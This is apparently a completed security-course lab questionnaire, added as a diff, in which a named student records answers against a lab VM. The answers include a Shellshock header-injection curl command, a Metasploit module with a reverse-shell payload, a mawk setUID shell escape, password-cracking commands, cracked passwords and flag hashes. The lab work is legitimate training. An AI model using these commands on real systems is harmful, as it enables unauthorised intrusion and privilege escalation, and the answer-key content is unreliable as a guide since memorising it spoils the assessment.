@@ -1,0 +1,184 @@
+Assignment Questionnaire
+========================
+
+NOTE: DO NOT DELETE --> and <--, and place your answers within the marks.
+  Example:
+    -->
+      130.207.7.210, scouter.cc.gatech.edu
+    <--
+
+
+Info
+====
+
+Example:
+  Your GT Login ID: kpark21
+  Your Name: Kyuhong Park
+
+-->
+  Your GT Login ID: skhadka9
+  Your Name: Suraj Khadka
+<--
+
+Task 1
+=======
+
+1. What is the IP address of the vulnerable VM on the NAT network?
+
+Example:
+  IP : 10.0.2.3
+-->
+  IP : 10.0.2.4
+<--
+
+
+2. Which port receives http traffic on the vulnerable VM.
+
+Example:
+  Port : 73
+
+-->
+  Port : 80
+<--
+
+
+Task 2
+=======
+
+1. What command did you use to exploit the shellshock vulnerability?
+
+Example:
+  Command : curl http://10.0.2.1:6262/cgi-bin/shellshock.cgi
+
+-->
+  Command : curl -H 'User-Agent: () { :; };  echo; /bin/task2 skhadka9' bash -s :'' http://10.0.2.4:80/cgi-bin/shellshock.cgi
+<--
+
+
+2. What hash value is returned by running ./bin/task2 with your student ID.
+
+-->
+  Hash : f7edb5ff34d33607c7973e020c4e7f893d08bd75e808579aee117a0062b1a4be
+<--
+
+
+Task 3 
+=======
+
+1. Give the full name of the exploit module you used.
+
+Example:
+  Module : auxiliary/scanner/portscan/tcp
+
+-->
+  Module : exploit/multi/http/apache_mod_cgi_bash_env_exec
+<--
+
+
+2. Give the full name of the payload you used:
+
+Example:
+  Payload : auxiliary/scanner/portscan/tcp
+
+-->
+  Payload : linux/x86/shell_reverse_tcp 
+<--
+
+
+3. What hash value is returned by running ./bin/task3 with your student ID.
+
+-->
+  Hash : 543c712da566cda2e36b4621ff84924e058a373583595b9ac531f2a03179911f
+<--
+
+
+Task 4
+=======
+
+1. What command did you use to find the program with the vulnerable setUID bit (assume the command is being rurn from the /usr/bin directory).
+
+Example:
+  Command : find . php
+
+-->
+  Command : find /usr/bin -perm -4000 -exec ls -l {} \;
+<--
+
+
+2. Give the name of the vulnerable program in /usr/bin. 
+
+Example:
+  Program : passwd
+
+-->
+  Program : mawk
+<--
+
+
+3. What command did you use to exploit the setUID vulnerability to spawn a shell.
+
+-->
+  Command : mawk 'BEGIN {system("/bin/sh")}'
+<--
+
+
+4. What hash value is returned by running ./bin/task4 with your student ID.
+
+-->
+  Hash : 2f1ed2d122e2d7d4ee86b46faa8a023ca314083aafeb9fe7e23ebbb6540ccc2d
+<--
+
+
+Task 5
+=======
+
+1. Give the John the Ripper command you used to find the password of task51.zip.
+
+-->
+  Command : /usr/sbin/john --incremental task51.hash
+<--
+
+
+2. What is the password for task51.zip.
+
+Example:
+  Password : 1234
+
+-->
+  Password : rt76y
+<--
+
+
+3. What hash value is returned by running python task51.pyc with your student ID.
+
+-->
+  Hash : fa492267a4e8180b4a3e8ea6184b40caf2a8a7e6176e84b9586ab2e657f35335
+<--
+
+
+4. Give the cewl command you used to create your wordlist.
+
+-->
+  Command : cewl http://10.0.2.4/cgi-bin/shellshock.cgi -d 13 -o -w wordlist.txt
+<--
+
+
+5. Give the John the Ripper command you used to find the password of task52.pyc.gpg.
+
+-->
+  Command : /usr/sbin/john --wordlist=~/Desktop/wordlist.txt --rules task52.hash
+<--
+
+
+6. What is the password for task52.pyc.gpg.
+
+-->
+  Password : Neuroscience9
+<--
+
+
+7. What hash value is returned by running python task52.pyc with your student ID.
+
+-->
+  Hash : 9d6dcd5f1f4cc6dfd520a33a2181b1a349ada20065d9d5062b735552b52e6076
+<--
